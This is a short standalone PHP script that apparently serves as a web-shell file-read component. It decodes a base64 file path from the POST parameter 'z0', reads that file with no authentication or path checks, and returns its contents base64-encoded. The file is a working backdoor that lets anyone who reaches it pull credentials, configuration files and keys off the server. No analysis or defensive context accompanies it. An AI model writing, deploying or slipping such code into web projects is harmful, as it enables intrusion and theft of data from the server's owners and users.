<?php

$file_path = base64_decode($_POST['z0']);
if (!file_exists($file_path))
    die('ERROR://Cannot find file: ' . $file_path);

$file_data = file_get_contents($file_path);
echo base64_encode($file_data);

?>